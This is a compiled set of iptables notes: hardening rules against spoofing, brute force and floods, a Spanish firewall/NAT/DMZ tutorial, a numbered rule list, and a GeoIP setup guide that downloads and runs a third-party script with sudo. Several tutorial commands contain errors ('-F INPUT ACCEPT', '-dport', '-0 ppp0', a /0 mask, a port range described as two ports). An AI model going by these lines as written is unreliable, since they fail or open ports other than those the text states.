$IPT -t raw -I PREROUTING -m rpfilter --invert -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[SPOOFING]: "
$IPT -t raw -I PREROUTING -m rpfilter --invert -j DROP

# Chain for preventing SSH brute-force attacks. Permits 10 new connections within 5 minutes from a single host
# then drops incomming connections from that host.
# Beyond a burst of 100 connections we log at up 1 attempt per second to prevent filling of logs
$IPT -N SSHBF
$IPT -N LOG_AND_DROP
$IPT -A INPUT -p tcp -m multiport --dports $SSHPORT,22 -m conntrack --ctstate NEW -j SSHBF
$IPT -A SSHBF -m recent --name sshnerds --rttl --rcheck --hitcount 3 --seconds 10 -j LOG_AND_DROP
$IPT -A SSHBF -m recent --name sshnerds --rttl --rcheck --hitcount 4 --seconds 86400 -j LOG_AND_DROP
$IPT -A LOG_AND_DROP -j LOG --log-prefix "[SSHBF]: " --log-level 7
$IPT -A LOG_AND_DROP -j DROP

# LOG and DROP all packets that are going to broadcast, multicast or anycast address
echo "\e[33mLogging and \e[31mdropping \e[33mbroadcast, multicast or anycast address \e[31mattacks"
$IPT -A INPUT -i $IFACE -m addrtype --dst-type BROADCAST -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[BROADCAST SPOOF]: "
$IPT -A INPUT -i $IFACE -m addrtype --dst-type MULTICAST -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[MULTICAST SPOOF]: "
$IPT -A INPUT -i $IFACE -m addrtype --dst-type ANYCAST -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[ANYCAST SPOOF]: "
$IPT -A INPUT -i $IFACE -m addrtype --dst-type BROADCAST -j DROP
$IPT -A INPUT -i $IFACE -m addrtype --dst-type MULTICAST -j DROP
$IPT -A INPUT -i $IFACE -m addrtype --dst-type ANYCAST -j DROP

# Drop all packets to port 111 except those from localhost
echo "\e[31mRejecting \e[33mall packets to port 111 excecpt packets from \e[32mlocalhost... "
$IPT -A INPUT ! -s 127.0.0.0/8 -p tcp --dport 111 -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[LOCAL SPOOFED]: "
$IPT -A INPUT ! -s 127.0.0.0/8 -p tcp --dport 111 -j REJECT --reject-with tcp-reset -m comment --comment "REJECT SPOOF"

# kill off identd quick
echo "\e[31mKilling \e[33midentd..."
$IPT -A INPUT -i $IFACE -p tcp --dport 113 -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[IDENTD]: "
$IPT -A INPUT -i $IFACE -p tcp --dport 113 -j REJECT --reject-with tcp-reset -m comment --comment "REJECT IDENTD"

# ICMP packets should fit in a Layer 2 frame, thus they should never be fragmented
# Fragmented icmp packets are a typical sign of a denial of service attack
echo "\e[36mLOG \e[33mand \e[31mDROP \e[33mfragmented icmp packets..."
$IPT -A INPUT -i $IFACE -p icmp --fragment -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[FRAGMENTED ICMP]: "
$IPT -A INPUT -i $IFACE -p icmp --fragment -j DROP -m comment --comment "DROP FRAGMENTED ICMP"

# Chain for preventing ping flooding - up to 2 pings per second from a single
# source, again with log limiting. Also prevents us from ICMP REPLY flooding
# some victim when replying to ICMP ECHO from a spoofed source.
echo "\e[31mDROP \e[33mIMCP FLOOD..."
$IPT -N ICMPFLOOD
$IPT -A ICMPFLOOD -m recent --set --name ICMP --rsource
$IPT -A ICMPFLOOD -m recent --update --seconds 1 --hitcount 2 --name ICMP --rsource --rttl -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[ICMP FLOOD]: "
$IPT -A ICMPFLOOD -m recent --update --seconds 1 --hitcount 2 --name ICMP --rsource --rttl -j DROP -m comment --comment "DROP ICMP FLOOD"

# Stop smurf attacks
echo "\e[32mEnabling \e[33msmurf \e[31mattack \e[33mdetector..."
$IPT -A INPUT -i $IFACE -p icmp -m icmp --icmp-type address-mask-request -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[SMURF MASK]: "
$IPT -A INPUT -i $IFACE -p icmp -m icmp --icmp-type timestamp-request -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[SMURF TIMESTAMP]: "
$IPT -A INPUT -i $IFACE -p icmp -m icmp --icmp-type address-mask-request -j DROP -m comment --comment "DROP SMURF ATTACK"
$IPT -A INPUT -i $IFACE -p icmp -m icmp --icmp-type timestamp-request -j DROP -m comment --comment "DROP SMURF ATTACK"
$IPT -A INPUT -i $IFACE -p icmp -j DROP

# Log incoming traffic in case some smart nerd got through all my sh!t
echo "\e[32mEnabling INC logging..."
$IPT -A INPUT -i $IFACE -m limit --limit 1/minute --limit-burst 3 -j LOG --log-prefix "[INC DEBUG]: "

# Log outgoing traffic before dropping everything for debug purpose
echo "\e[32mEnabling OUT logging..."
$IPT -A OUTPUT -o $IFACE -m limit --limit 1/minute --limit-burst 3 -j LOG --log-prefix "[OUT DEBUG]: "


#### iptables

#### La sintaxis es ####

iptables -A cadena -s ip_orgigen -d ip_destino -p protocolo --dport puerto -j accion

#### Donde: ####

Cadena = INPUT, OUTPUT o FORWARD

ip_origen = Origen de los paquetes, esto puede ser una sola IP o una red y en este caso debemos especificar la mascara ).

ip_destino = hacia donde se dirigen los paquetes. esto puede ser una sola IP o una red y en este caso debemos especificar la mascara ).

protocolo = indica el protocolo que usan los paquetes (ICMP, TCP, UDP...)

puerto = puerto destino del trafico.

accion = DROP o ACCEPT.

#############################################################################################################################################################################################

#### iptables pdf

#### que es un firewall? ####

un firewall tambien es conocido como muro de fuego, este funciona entre las redes conectadas permitiendo o denegando las comunicaciones entre dichas redes. tambien un firewall es considerado un filtro que controla el trafico de varios protocolos como TCP/UDP/ICMP que pasan por el para permitir o denegar algun servicio, el firewall examina la peticion y dependiendo de este lo puede bloquear o permitirle el acceso un firewall puede ser un dispositivo de tipo hardware o software que de instala entre la conexion a internet y las redes conectadas en el lugar, como podemos ver en la figura 1.1. 


#### dmz ####

un firewall con configuracion dmz indica que va tener una zona desmilitarizada o red perimetral, es una red local en la cual se encuentra dentro de una organizacion. para poder ser una zona tipo dmz deben ver servidores ofreciendo servicios de www, ftp, dns, samba, etc, esto permite ofrecer servicios de una red local hacia el exterior. dentro de esta zona se podra tener acceso desde la red local e internet y firewall controlara los accesos a los servicios que se encuentren alojados dentro de la dmz, como podemos ver en la figura 1.2. 


#### firewall gnu/linux ####

en gnu/linux existe gran variedad de herramientas que nos permite controlar nuestro firewall desde un servidor que este conectado a internet y a la red local. esta herramientas son: ipchains: esta herramienta ya quedo en el olvido ya que se usaba para kernel 2.4. iptables: esta herramienta es la que se esta ocupando actualmente y aparecio a partir del kernel 2.4 y 2.6 en adelante. con iptables crea las reglas mas rapidas y sencillas que ipchains. shorewall: es una herramienta muy flexible, rapida y sencilla que permite crear reglas iptables, en shorewall se configuran varios archivos para poder controlar el firewall de nuestra red. ufw: esta es un herramienta que nos permite crear reglas iptables de una forma demasiado sencilla dentro de distribuciones debian, ubuntu y derivados. 


#### conceptos iptables ####

antes de poder administrar nuestro firewall tendremos que saber para que nos sirve cada de una de las tablas que usa  iptables para sus reglas. 


#### tablas ####

cuando nosotros enviamos un paquete o una solicitud de servicio este pasa por 3 tipos de tablas que debemos conocer. 


#### nat ####

esta tabla que debe ser usada cuando se desea hacer los paquetes sean enrutados a una maquina cliente dentro de una red local o dmz, pero tambien podremos enmascarar un red local y tener salida hacia internet. dentro de esta tabla tenemos las siguientes opciones: 

* DNAT: este parametro se emplea cuando tenemos casos en donde se tiene un ip publica y el servicio se encuentra dentro de la red local o dmz y el firewall el encargado de redirigir esta peticion a la maquina en donde se encuentre el servicio. 
* SNAT: esta opcion se ocupa cuando queremos esconder nuestra ip de red local o dmz, cambiandola dentro del firewall con la ip publica del servidor. 
* MASQUERADE: hace lo mismo que SNAT, pero MASQUERADE automaticamente convierte nuestra ip de la red local o dmz a ip publica y se recomienda tener esta configuracion cuando en nuestra red asignamos ip de forma dhcp. 


#### mangle ####
esta tabla se usa principalmente para modificar paquetes. dentro de esta tabla tenemos las siguientes opciones: 

* TOS: es usado para definir o cambiar el tipo de servicio de un paquete que puede ser usado para configurar politicas en la red considerando a ser enrutados los paquetes, no lo uses para paquetes que vayan hacia internet. 
* TTL: es usado para cambiar el campo tiempo de vida de un paquete y con ello conseguir un TTL especifico. 
* MARK: se usa para marca los paquetes con valores especifico, con estas marcas podremos limitar el ancho de banda y generar colas. 


#### filter ####
esta esta la tabla principal para el filtrado de paquetes que podemos comparar y filtar paquetes dentro del firewall. dentro de esta tabla tenemos las siguientes opciones: 

* INPUT: paquetes de entrada hacia nuestro firewall. 
* FORWARD: paquetes enrutados por medio del firewall a otra maquina. 
* OUTPUT: paquetes de salida de nuestro firewall. 


#### estados ####

los estados en realidad son los seguimientos de conexiones dentro del firewall. para esto tenemos las siguiente opciones: 

* ESTABLISHED: el paquete seleccionado se asocia con otros paquetes en una conexion establecida. 
* INVALID: el paquete seleccionado no puede ser asociado hacia ninguna conexion conocida. 
* NEW: el paquete seleccionado esta creando una nueva conexion o bien forma parte de una conexion de dos caminos. 
* RELATED: el paquete seleccionado esta iniciando una nueva conexion en algun punto de la conexion existente. 

podemos tomar decisiones a partir del estado del paquete por medio del modulo state con el parametro "-m state", se refiere a la posibilidad de mantener informacion sobre el estado de la conexion en memoria. el seguimiento de conexiones se realiza en cadenas prerouting y OUTPUT, el numero maximo de conexiones esta guardada en /proc/sys/net/ipv4/ip_conntrack_max. 


#### protocolos ####

todos los servicios manejan protocolos para su comunicaciones, por lo cual iptables podremos administrar servicios dentro de los protocolos: 

* TCP: protocolo de control de transmision, este protocolo es mas utilizado por los servicios ofrecidos por algun servidor. 
* UDP: protocolo de datagrama de usuario, sirve para el envia de datagrama pero debe existir una conexion establecida. 
* ICMP: protocolo de mensajes de control y error de internet, este protocolo solamente lo utilizamos cuando hacemos envio de paquetes de un maquina a otra, en resumen es un ping. 

para poder ocupar estos protocolos podremos ocupar el parametro -p. 


#### objetivos ####
cuando nosotros creamos una regla iptables tenemos varias acciones basicas en las cuales podremos indicar al firewall que hacer con ellas. estas acciones son: 

* ACCEPT: acepta los paquete que pase por el firewall. 
* DROP: deniega los paquete que pase por el firewall, cortando la comunicacion. 
* REJECT: funciona basicamente igual que el objetivo DROP, aunque en este caso se devuelve un mensaje de error al host que envio el paquete bloqueado. 
* REDIRECT: sirve para redirigir paquetes y flujos hacia una maquina de la red local o dmz. tambien sirve para redirigir peticiones entre puerto del mismo firewall para la activacion de servicios. 
* MASQUERADE: hace lo mismo que SNAT, pero MASQUERADE automaticamente convierte nuestra ip de la red local o dmz a ip publica y se recomienda tener esta configuracion cuando en nuestra red asignamos ip de forma dhcp. 
* LOG: este objetivo funciona para registrar informacion detallada sobre los paquetes que pasan por el firewall. 


#### comando iptables ####

hasta este momento solamente sabemos sobre los conceptos de iptables pero ahora aprenderemos la estructura de la creacion de la reglas de iptables y con parametros que podemos utilizar. el comando iptables contiene las siguientes opciones: 

opcion descripcion 

-A agrega una cadena iptables al firewall. 
-C verifica una cadena antes de anadirla al firewall. 
-D borra una cadena de iptables en el firewall 
-E renombra una cadena de iptables. 
-F libera o limpia de cadena en el firewall. 
-I inserta una cadena en una cadena en un punto especificado por un valor entero definido por el usuario. 
-L lista todas las cadena de iptables aplicadas en el firewall. 
-N crea una nueva cadena con un nombre especificando por el usuario. 
-P configura la politica por defecto en una cadena en particular y puede ser ACCEPT o DROP. 
-R reemplaza una regla en una cadena en particular, se debe especificar el numero de regla. 
-X borra cadenas especificada por el usuario, no se permiten borrar cadenas no creada por el usuario. 
-Z pone en ceros los contadores de bytes y de paquetes. 


#### parametros iptables ####

el comando iptables tiene varios parametros que debemos conocer antes de ver su nomenclatura ya que estos parametros nos sirve para indicar alguna propiedad a nuestra regla creada dentro de firewall. entonces revisemos los siguientes paramentas de iptables. 

con esto ya tenemos todas las opciones necesarias necesarias que podremos utilizar en iptables. 


#### nomenclatura iptables ####

ahora aprenderemos la nomenclatura. 

iptables -A [filtro] [parametros de la regla] [objetivo] 

comenzaremos a ver algunas reglas de iptables. 

ejemplo 1: se aceptaran todas la peticiones que vengan por la interfaz de red eth0. 

iptables -A INPUT -i eth0 -j ACCEPT 

ejemplo 2: se aceptan todas las peticiones de vayan al puerto 80 por la interfaz eth0. 

iptables -A INPUT -i eth0 -p TCP --dport 80 -j ACCEPT 

ejemplo 3: rechazamos todas las peticiones del protocolo ICMP en todas las interfaces de red, no aceptamos ping. 

iptables -A INPUT -p ICMP -j REJECT 


#### firewall basico ####

ahora veremos la configuracion basica de un iptables, creando nuestra reglas y describiendola para que sirve cada 
una. 

## limpiando reglas de iptables en todas las tablas. 
iptables -F
iptables -X 
iptables -Z

## establecemos politica por defecto de cada de una de la tablas. 
iptables -P INPUT ACCEPT 
iptables -P OUTPUT ACCEPT 
iptables -P FORWARD ACCEPT 

#aceptamos conexiones locales en la interfaz lo 
iptables -A INPUT -i lo -j ACCEPT 

#aceptamos todas la conexiones al puerto 22/ssh por la interfaz de red eth0. 
iptables -A INPUT -i eth0 -p TCP --dport 22 -j ACCEPT 

#aceptamos todas la conexiones al puerto 80/apache por la interfaz de red eth0. 
iptables -A INPUT -i eth0 -p TCP --dport 80 -j ACCEPT 

#rechaza todas la demas conexiones desde el puerto 1 al 1024 por protocolo TCP/UDP por la interfaz de red eth0. 
iptables -A INPUT -i eth0 -p TCP --dport 1:1024 -j REJECT 
iptables -A INPUT -i eth0 -p UDP --dport 1:1024 -j REJECT 

solamente queda verificar que haya ejecutado las reglas correctamente, para verificarlo ejecutamos el siguiente comando. 

lucifer:~# iptables -nL


#### firewall lan ####

ahora veremos como configurar un firewall del tipo lan: 

* los clientes de la red local podran acceder a internet pero solo a servicio de http/https y dns. 
* desde internet se permitira conectarse a servicios de http/ftp que estan dentro de la red local. 

## limpiando reglas de iptables en todas las tablas. 
iptables -F
iptables -X 
iptables -Z 
iptables -t nat -F

### establecemos politica por defecto 
iptables -P INPUT ACCEPT 
iptables -P OUTPUT ACCEPT 
iptables -P FORWARD ACCEPT 
iptables -t nat -p prerouting ACCEPT 
iptables -t nat -p postrouting ACCEPT 

### todas la peticiones que vengan de internet hacia el puerto 80 redirigirlo a la maquina de la red 
local con ip 192.168.1.12:80. 
iptables -t nat -a prerouting -i ppp0 -p TCP --dport 80 -j DNAT --to 192.168.1.12:80 

### todas la peticiones que vengan de internet hacia el puerto 21 redirigirlo a la maquina de la red 
local con ip 192.168.1.52:21. 
iptables -t nat -A PREROUTING -i ppp0 -p TCP --dport 21 -j DNAT --to 192.168.1.52:21 

### aceptamos conexiones locales en la interfaz lo 
iptables -A INPUT -i lo -j ACCEPT 

### tenemos acceso al firewall desde el segmento de red 192.168.1.0 por la interfaz eth1 
iptables -A INPUT -s 192.168.1.0/24 -i eth1 -j ACCEPT 

### aceptamos que todo el trafico que viene desde la red local vaya hacia los puertos 80/443 sean aceptadas estas son solicitudes http/https 

iptables -A FORWARD -s 192.168.1.0/24 -i eth1 -p TCP --dport 80 -j ACCEPT 
iptables -A FORWARD -s 192.168.1.0/24 -i eth1 -p TCP --dport 443 -j ACCEPT 

### aceptamos que consultas de dns de la red local 
iptables -A FORWARD -s 192.168.1.0/24 -i eth1 -p TCP --dport 53 -j ACCEPT 
iptables -A FORWARD -s 192.168.1.0/24 -i eth1 -p UDP --dport 53 -j ACCEPT 

### denegamos el resto de los servicios 
iptables -A FORWARD -s 192.168.1.0/24 -i eth1 -j REJECT 

### ahora hacemos enmascaramiento de la red local 
iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE 
echo 1 > /proc/sys/net/ipv4/ip_forward 

#rechaza todas la demas conexiones desde el puerto 1 al 1024 por protocolo TCP/UDP por la interfaz de red eth0. 
iptables -A INPUT -s 0.0.0.0/0 -p TCP -dport 1:1024 -j DROP 
iptables -A INPUT -s 0.0.0.0/0 -p UDP -dport 1:1024 -j DROP 


#### firewall lan/dmz. ####

ahora veremos como configurar nuestro firewall con la comunicacion de la lan/internet a dmz: 

* los clientes de la red local pueden conectarse a servicios del tipo apache y samba en la dmz, 
* desde internet se permitira conectarse a servicios de apache que se encuentran en dmz. 

## limpiando reglas de iptables en todas las tablas. 
iptables -F
iptables -X 
iptables -Z 
iptables -t nat -F

### establecemos politica por defecto 
iptables -F INPUT ACCEPT 
iptables -F OUTPUT ACCEPT 
iptables -F FORWARD ACCEPT 
iptables -t nat -P PREROUTING ACCEPT 
iptables -t nat -P POSTROUTING ACCEPT 

### todas la peticiones que vengan de internet hacia el puerto 8080 redirigirlo a la maquina de la dmz con ip 10.0.2.30:80. 

iptables -t nat -A PREROUTING -i ppp0 -p TCP --dport 8080 -j DNAT --to 10.0.2.30:80 

### aceptamos conexiones locales en la interfaz lo 
iptables -A INPUT -i lo -j ACCEPT 

### tenemos acceso al firewall desde la red local y dmz 
iptables -A INPUT -s 192.168.1.0/24 -i eth1 -j ACCEPT 
iptables -A INPUT -s 10.0.2.0/24 -i eth2 -j ACCEPT 

### ahora hacemos enmascaramiento de la red local y dmz 
iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE 
iptables -t nat -A POSTROUTING -s 10.0.2.0/24 -o eth0 -j MASQUERADE 
echo 1 > /proc/sys/net/ipv4/ip_forward 

### apache1 "conexion del servicio desde la red local a dmz" 
iptables -A FORWARD -s 192.168.1.0/24 -d 10.0.2.30 -p TCP --dport 80 -j ACCEPT 
iptables -A FORWARD -s 10.0.2.30 -d 192.168.1.0/24 -p TCP --dport 80 -j ACCEPT 

### samba "conexion del servicio desde la red local a dmz" 
iptables -A FORWARD -s 192.168.1.0/24 -d 10.0.2.50 -p TCP --dport 139 -j ACCEPT 
iptables -A FORWARD -s 10.0.2.50 -d 192.168.1.0/24 -p TCP --dport 139 -j ACCEPT 

iptables -A INPUT -s 0.0.0.0/0 -p TCP -dport 1:1024 -j DROP 
iptables -A INPUT -s 0.0.0.0/0 -p UDP -dport 1:1024 -j DROP 


#### reglas extras ####

en este capitulo solo mostraremos algunas otras reglas que han faltado explicar. 

#### habilitando varios puerto en una regla ####

dentro de iptables tenemos la capacidad de armar reglas para nuestro firewall con varios puerto de conexion al mismo. 

ejemplo 1: permitimos las conexion desde cualquier equipo de la red local al servidor en los puerto 22 y 80. 

iptables -A INPUT -s 192.168.1.0/24 -p TCP --dport 22:80 -j ACCEPT 

ejemplo 2: solamente permitiremos la conexion del cliente con la ip 192.168.1.50 a los puertos 20 y 21. 

iptables -A INPUT -s 192.168.1.50 -p TCP --dport 20:21 -j ACCEPT 


#### proxy transparente ####

esta regla es de mucha ayuda para los administradores no tener que ir cliente por cliente en la red a configurar sus navegadores web que con esta hacemos un redireccionamiento de puertos en el mismo servidor. 


toda peticiones que venga por la interfaz de red eth1 y con salida al puerto 80 redirecciona al puerto 3128. 

iptables -t nat -A PREROUTING -i eth1 -p TCP --dport 80 -j REDIRECT --to-port 3128 


#### bloquear pings ####

explicaremos varias reglas que podremos utilizar para bloquear los ping. ejemplo 1: podremos bloquear los pings que nos envie un cliente o un segmento de red. 

iptables -A INPUT -p ICMP -s 192.168.1.0/0 -j DROP 
iptables -A INPUT -p ICMP -s 192.168.1.100 -j DROP 

ejemplo 2: pero si quisieramos bloquear completamente hacia cualquier interfaz entonces esta seria la regla. 

iptables -A INPUT -p ICMP -s 0.0.0.0/0 -j DROP 


#### bloquear mac tambien es posible bloquear clientes, etc por la mac address de su maquina cliente ####

iptables -A INPUT -m mac --mac-source 00:15:c5:b5:33:6c -j DROP 


#### vpn ####
para un servicio como openvpn tambien es necesaria tener sus propias reglas de iptables para hacer la conexiones a los tuneles. aceptamos el trafico que entrada y salida por el protocolo UDP por el servicio openvpn. 

iptables -A INPUT -i ppp0 -p UDP --dport 1194 -j ACCEPT 
iptables -A OUTPUT -0 ppp0 -p UDP --sport 1194 -j ACCEPT 

en este caso la interfaz de escucha del servicio es ppp0 pero tambien puede ser eth0. permitimos la conexion desde cualquier equipo por la interfaz tun. 

[root@test ~]# iptables -A INPUT -i tun+ -j ACCEPT 
[root@test ~]# iptables -A OUTPUT -o tun+ -j ACCEPT 

permitimos que los equipos de las otras redes accedaan a nuestra red.. 

[root@test ~]# iptables -A FORWARD -i tun+ -j ACCEPT 
[root@test ~]# iptables -A FORWARD -o tun+ -j ACCEPT 


#### thegeekstuff

#### modify this file accordingly for your specific requirements ####
#### http://www.thegeekstuff.com ####
#### 1. delete all existing rules iptables ####

iptables -F

#### 2. set default chain policies iptables ####

iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

#### 3. block a specific ip-address iptables ####

block_this_ip="x.x.x.x"
iptables -A INPUT -s "$block_this_ip" -j DROP

#### 4. allow all incoming ssh iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 22 -m state --state ESTABLISHED -j ACCEPT

#### 5. allow incoming ssh only from a sepcific network iptables ####

iptables -A INPUT -i eth0 -p TCP -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 22 -m state --state ESTABLISHED -j ACCEPT

#### 6. allow incoming http http iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 80 -m state --state ESTABLISHED -j ACCEPT

#### allow incoming https https iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 443 -m state --state ESTABLISHED -j ACCEPT

#### 7. multiports (allow incoming ssh ssh, http http, and https https) iptables ####

iptables -A INPUT -i eth0 -p TCP -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT

#### 8. allow outgoing ssh ssh iptables ####

iptables -A OUTPUT -o eth0 -p TCP --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p TCP --sport 22 -m state --state ESTABLISHED -j ACCEPT

#### 9. allow outgoing ssh only to a specific network iptables ####

iptables -A OUTPUT -o eth0 -p TCP -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p TCP --sport 22 -m state --state ESTABLISHED -j ACCEPT

#### 10. allow outgoing https https iptables ####

iptables -A OUTPUT -o eth0 -p TCP --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p TCP --sport 443 -m state --state ESTABLISHED -j ACCEPT

#### 11. load balance incoming https https traffic iptables ####

iptables -A prerouting -i eth0 -p TCP --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443
iptables -A prerouting -i eth0 -p TCP --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443
iptables -A prerouting -i eth0 -p TCP --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443

#### 12. ping from inside to outside iptables ####

iptables -A OUTPUT -p ICMP --ICMP-type echo-request -j ACCEPT
iptables -A INPUT -p ICMP --ICMP-type echo-reply -j ACCEPT

#### 13. ping from outside to inside iptables ####

iptables -A INPUT -p ICMP --ICMP-type echo-request -j ACCEPT
iptables -A OUTPUT -p ICMP --ICMP-type echo-reply -j ACCEPT

#### 14. allow loopback access iptables ####

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#### 15. allow packets from internal network to reach external network. iptables ####
#### if eth1 is connected to external network (internet) iptables ####
#### if eth0 is connected to internal network (192.168.1.x) iptables ####

iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT

#### 16. allow outbound dns dns iptables ####

iptables -A OUTPUT -p UDP -o eth0 --dport 53 -j ACCEPT
iptables -A INPUT -p UDP -i eth0 --sport 53 -j ACCEPT

#### 17. allow nis connections iptables ####
#### rpcinfo -p | grep ypbind ; this port is 853 and 850 iptables ####

iptables -A INPUT -p TCP --dport 111 -j ACCEPT
iptables -A INPUT -p UDP --dport 111 -j ACCEPT
iptables -A INPUT -p TCP --dport 853 -j ACCEPT
iptables -A INPUT -p UDP --dport 853 -j ACCEPT
iptables -A INPUT -p TCP --dport 850 -j ACCEPT
iptables -A INPUT -p UDP --dport 850 -j ACCEPT

#### 18. allow rsync from a specific network iptables ####

iptables -A INPUT -i eth0 -p TCP -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 873 -m state --state ESTABLISHED -j ACCEPT

#### 19. allow mysql connection only from a specific network iptables ####

iptables -A INPUT -i eth0 -p TCP -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 3306 -m state --state ESTABLISHED -j ACCEPT

#### 20. allow sendmail or postfix iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 25 -m state --state ESTABLISHED -j ACCEPT

#### 21. allow imap and imaps iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 143 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p TCP --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 993 -m state --state ESTABLISHED -j ACCEPT

#### 22. allow pop3 and pop3s iptables ####

iptables -A INPUT -i eth0 -p TCP --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 110 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p TCP --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 995 -m state --state ESTABLISHED -j ACCEPT

#### 23. prevent DOS attack iptables ####

iptables -A INPUT -p TCP --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

#### 24. port forwarding 422 to 22 iptables ####

iptables -t nat -A PREROUTING -p TCP -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22
iptables -A INPUT -i eth0 -p TCP --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p TCP --sport 422 -m state --state ESTABLISHED -j ACCEPT

#### 25. Log dropped packets iptables ####

iptables -N logging
iptables -A INPUT -j logging
iptables -A logging -m limit --limit 2/min -j LOG --log-prefix "iptables packet dropped: " --log-level 7
iptables -A logging -j DROP



#### terminal28

Tested:

    Debian 6.0.x,
    Debian 7.x.x.
    Debian 8.x.x
    iptables v1.4.14

1. Install some needed iptables-geoip dependencies .

sudo apt-get install libtext-csv-xs-perl module-assistant geoip-database libgeoip1

2. Install modules xtables-addons.

For Debian 6 Squeeze and Debian 7 Wheezy:

sudo module-assistant --verbose --text-mode auto-install xtables-addons 

For Debian 8 Jessie:

apt-get install install libtext-csv-xs-perl xtables-addons-common

3. Download and install database geoip (maxmind).

sudo mkdir /usr/share/xt_geoip
cd /usr/share/xt_geoip
sudo wget http://terminal28.com/wp-content/uploads/2013/10/geoip-dl-build.tar.gz
sudo tar xvf geoip-dl-build.tar.gz
sudo ./xt_geoip_dl
sudo ./xt_geoip_build -D . *.csv
sudo rm -fr geoip-dl-build.tar.gz

4. Configure iptables.

Example.
Blocked countries: China (CN), Ukraine (UA), Taiwan (TW).

iptables -A INPUT -m geoip --src-cc CN,UA,TW -j DROP

Attention!

You can add max 10 countries in one rule.

Restart server.

sudo reboot 

More about iptables and geoip:

sudo iptables -m geoip --help

5. ISO 3166 Country Codes.

Country                                         A 2     A 3     Number
----------------------------------------------------------------------
AALAND ISLANDS                                  AX      ALA     248
AFGHANISTAN                                     AF      AFG     004
ALBANIA                                         AL      ALB     008
ALGERIA                                         DZ      DZA     012
AMERICAN SAMOA                                  AS      ASM     016
ANDORRA                                         AD      AND     020
ANGOLA                                          AO      AGO     024
ANGUILLA                                        AI      AIA     660
ANTARCTICA                                      AQ      ATA     010
ANTIGUA AND BARBUDA                             AG      ATG     028
ARGENTINA                                       AR      ARG     032
ARMENIA                                         AM      ARM     051
ARUBA                                           AW      ABW     533
AUSTRALIA                                       AU      AUS     036
AUSTRIA                                         AT      AUT     040
AZERBAIJAN                                      AZ      AZE     031
BAHAMAS                                         BS      BHS     044
BAHRAIN                                         BH      BHR     048
BANGLADESH                                      BD      BGD     050
BARBADOS                                        BB      BRB     052
BELARUS                                         BY      BLR     112
BELGIUM                                         BE      BEL     056
BELIZE                                          BZ      BLZ     084
BENIN                                           BJ      BEN     204
BERMUDA                                         BM      BMU     060
BHUTAN                                          BT      BTN     064
BOLIVIA                                         BO      BOL     068
BOSNIA AND HERZEGOWINA                          BA      BIH     070
BOTSWANA                                        BW      BWA     072
BOUVET ISLAND                                   BV      BVT     074
BRAZIL                                          BR      BRA     076
BRITISH INDIAN OCEAN TERRITORY                  IO      IOT     086
BRUNEI DARUSSALAM                               BN      BRN     096
BULGARIA                                        BG      BGR     100
BURKINA FASO                                    BF      BFA     854
BURUNDI                                         BI      BDI     108
CAMBODIA                                        KH      KHM     116
CAMEROON                                        CM      CMR     120
CANADA                                          CA      CAN     124
CAPE VERDE                                      CV      CPV     132
